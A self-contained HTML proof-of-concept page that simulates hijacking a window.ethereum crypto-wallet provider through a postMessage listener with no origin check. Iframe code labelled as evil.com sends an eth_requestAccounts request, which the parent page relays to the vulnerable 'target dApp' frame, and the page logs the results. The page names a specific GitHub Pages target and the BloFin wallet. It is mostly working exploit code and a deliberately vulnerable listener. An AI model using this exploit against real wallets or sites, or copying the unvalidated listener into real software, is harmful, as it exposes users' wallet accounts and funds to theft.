<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PostMessage & window.ethereum Hijack PoC (All-in-One)</title>
    <style>
        body { font-family: monospace; background: #121212; color: #00ffcc; padding: 20px; }
        .container { display: flex; gap: 20px; }
        .box { flex: 1; border: 1px solid #444; background: #1e1e1e; padding: 10px; }
        iframe { width: 100%; height: 200px; border: 1px solid #333; background: #000; }
        #logArea { display: block; white-space: pre-wrap; background: #000; padding: 10px; border: 1px solid #333; margin-top: 10px; max-height: 150px; overflow-y: auto; color: #ff5555; }
    </style>
</head>
<body>

    <h2>[PoC] PostMessage to window.ethereum Provider Hijack</h2>
    <p>Target: Testing missing origin validation on provider bridge.</p>

    <div class="container">
        <!-- Iframe A: Target Context (Simulasi 0x403for.github.io) -->
        <div class="box">
            <h3>Iframe A (Target dApp)</h3>
            <iframe id="iframeA" srcdoc='
                <h4>Target Context</h4>
                <p id="status">Status: Waiting for postMessage...</p>
                <script>
                    window.addEventListener("message", async function(event) {
                        // VULNERABILITY: Tidak ada validasi event.origin yang ketat
                        const data = event.data;
                        if (data && data.type === "WEB3_REQUEST") {
                            document.getElementById("status").innerText = "Processing request from: " + event.origin;
                            
                            // Simulasi interaksi window.ethereum / BloFin
                            let response;
                            if (window.ethereum) {
                                response = await window.ethereum.request({ method: data.method, params: data.params });
                            } else {
                                response = ["0xMockedBloFinWalletAddress12345"]; // Fallback mock
                            }

                            // Mengirim balik response ke origin pengirim (bisa dicuri evil.com)
                            event.source.postMessage({
                                status: "SUCCESS",
                                result: response
                            }, event.origin);
                        }
                    });
                </script>
            '></iframe>
        </div>

        <!-- Iframe B: Attacker Context (Simulasi evil.com) -->
        <div class="box">
            <h3>Iframe B (Attacker / evil.com)</h3>
            <iframe id="iframeB" srcdoc='
                <h4>Attacker Context</h4>
                <p id="atk-status">Status: Ready to attack...</p>
                <script>
                    // Menyerang Iframe A atau induk dengan memanfaatkan celah postMessage
                    setTimeout(() => {
                        document.getElementById("atk-status").innerText = "Sending malicious postMessage to target...";
                        // Mencari window target (parent atau iframe lain)
                        window.parent.postMessage({
                            target: "iframeA",
                            type: "WEB3_REQUEST",
                            method: "eth_requestAccounts",
                            params: []
                        }, "*");
                    }, 2000);
                </script>
            '></iframe>
        </div>
    </div>

    <h3>Execution Log (Controller):</h3>
    <div id="logArea"></div>

    <script>
        function log(msg) {
            const d = document.getElementById('logArea');
            d.innerHTML += `[+] ${msg}\n`;
            d.scrollTop = d.scrollHeight;
        }

        window.addEventListener('message', function(event) {
            log(`Controller intercepted message from origin [${event.origin}]:`);
            log(JSON.stringify(event.data, null, 2));

            // Jika Iframe B meminta controller meneruskan payload ke Iframe A (Cross-Frame Attack Simulation)
            if (event.data && event.data.type === 'WEB3_REQUEST') {
                log("Relaying malicious request to Iframe A...");
                const frameA = document.getElementById('iframeA').contentWindow;
                frameA.postMessage(event.data, '*');
            }
        });

        setTimeout(() => {
            log("PoC Environment Initialized. Monitoring message flows...");
        }, 1000);
    </script>

</body>
</html>
